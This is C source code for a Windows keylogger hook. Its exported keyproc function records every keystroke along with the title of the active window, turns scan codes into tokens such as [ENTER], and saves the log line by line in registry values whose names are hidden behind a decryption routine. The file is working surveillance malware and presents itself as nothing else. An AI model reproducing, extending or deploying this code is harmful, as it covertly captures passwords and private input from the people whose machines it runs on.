#ifndef _KEYPROC_INCLUDED_
#define _KEYPROC_INCLUDED_

char *keyproc_toi(int i)
{
static char rz[25];
char rrzz[10];
strcpy(rz,crypt.val_strs);
rrzz[0]=((i/1000)%10)+'0';
rrzz[1]=((i/100)%10)+'0';
rrzz[2]=((i/10)%10)+'0';
rrzz[3]=((i/1)%10)+'0';
rrzz[4]=0;
strcat(rz,rrzz);
return rz;
}

__declspec(dllexport) LRESULT CALLBACK keyproc(int code,WPARAM wParam,LPARAM lParam)
{
unsigned char bf[55],bf2[200];
int scan;
int lines;

//MessageBeep(0xFFFFFFFF);
decrypt();

lines=0;
regist_getbin(crypt.reg_data,crypt.val_num,(char*)&lines,sizeof(int));

if(lines==0)
      {
      regist_set(crypt.reg_data,keyproc_toi(lines),"Startup.");
      lines++;
      regist_set(crypt.reg_data,keyproc_toi(lines),"");
      };

if((!(lParam&0x80000000))&&wParam!=0)
  { 
  static HWND lastwnd=NULL;// this is error, but it's working
  if(lastwnd!=GetForegroundWindow())
      {
      lastwnd=GetForegroundWindow();
      bf[0]=0;GetWindowText(GetForegroundWindow(),(char*)bf,50);bf[50]=0;
      strcpy((char*)bf2,"   @@ ");
      strcat((char*)bf2,(char*)bf);
      strcat((char*)bf2," @@");
      lines++;
      regist_set(crypt.reg_data,keyproc_toi(lines),"");
      lines++;
      regist_set(crypt.reg_data,keyproc_toi(lines),(char*)bf2);
      lines++;
      regist_set(crypt.reg_data,keyproc_toi(lines),"");
      };

  bf[0]=(unsigned char)wParam;bf[1]=0;
  if(bf[0]<32){ bf[0]='#'; };
  if(bf[0]>='A'&&bf[0]<='Z'){ bf[0]+='a'-'A'; };

  scan=HIWORD(lParam)&0x7F;
  if(scan==1 ){ strcpy((char*)bf,"[ESC]"); };
  if(scan==14){ strcpy((char*)bf,"[BCK]"); };
  if(scan==15){ strcpy((char*)bf,"[TAB]"); };
  if(scan==28){ strcpy((char*)bf,"[ENTER]"); };
  if(scan==29){ strcpy((char*)bf,"[CTRL]"); };
  if(scan==42){ strcpy((char*)bf,"[LSHIFT]"); };
  if(scan==54){ strcpy((char*)bf,"[RSHIFT]"); };
  if(scan==56){ strcpy((char*)bf,"[ALT]"); };
  if(scan==58){ strcpy((char*)bf,"[CAPS]"); };
  if(scan>58&&scan<68){ strcpy((char*)bf,"[F_]"); bf[2]=(unsigned char)(scan-59+'1'); };
  if(scan==68){ strcpy((char*)bf,"[F10]"); };
  if(scan==87){ strcpy((char*)bf,"[F11]"); };
  if(scan==88){ strcpy((char*)bf,"[F12]"); };
  if(scan==69){ strcpy((char*)bf,"[NUM]"); };
  if(scan==70){ strcpy((char*)bf,"[SCROLL]"); };
  if(scan==71){ strcpy((char*)bf,"[HOME]"); };
  if(scan==72){ strcpy((char*)bf,"[UP]"); };
  if(scan==73){ strcpy((char*)bf,"[PGUP]"); };
  if(scan==75){ strcpy((char*)bf,"[<-]"); };
  if(scan==77){ strcpy((char*)bf,"[->]"); };
  if(scan==79){ strcpy((char*)bf,"[END]"); };
  if(scan==80){ strcpy((char*)bf,"[DN]"); };
  if(scan==81){ strcpy((char*)bf,"[PGDN]"); };
  if(scan==82){ strcpy((char*)bf,"[INS]"); };
  if(scan==83){ strcpy((char*)bf,"[DEL]"); };
  if(scan==12){ strcpy((char*)bf,"-"); };
  if(scan==13){ strcpy((char*)bf,"="); };
  if(scan==26){ strcpy((char*)bf,"{"); };
  if(scan==27){ strcpy((char*)bf,"}"); };
  if(scan==39){ strcpy((char*)bf,";"); };
  if(scan==40){ strcpy((char*)bf,"\'"); };
  if(scan==41){ strcpy((char*)bf,"`"); };
  if(scan==43){ strcpy((char*)bf,"\\"); };
  if(scan==51){ strcpy((char*)bf,","); };
  if(scan==52){ strcpy((char*)bf,"."); };
  if(scan==53){ strcpy((char*)bf,"/"); };

  regist_get(crypt.reg_data,keyproc_toi(lines),(char*)bf2);
  strcat((char*)bf2,(char*)bf);
  regist_set(crypt.reg_data,keyproc_toi(lines),(char*)bf2);
  if(strlen((char*)bf2)>60)
       {
       lines++;
       regist_set(crypt.reg_data,keyproc_toi(lines),"");
       };
  };

regist_setbin(crypt.reg_data,crypt.val_num,(char*)&lines,sizeof(int));

HHOOK rkeyhook;
regist_getbin(crypt.reg_data,crypt.val_hook,(char*)&rkeyhook,sizeof(HHOOK));
return CallNextHookEx(rkeyhook,code,wParam,lParam);;
}

#endif
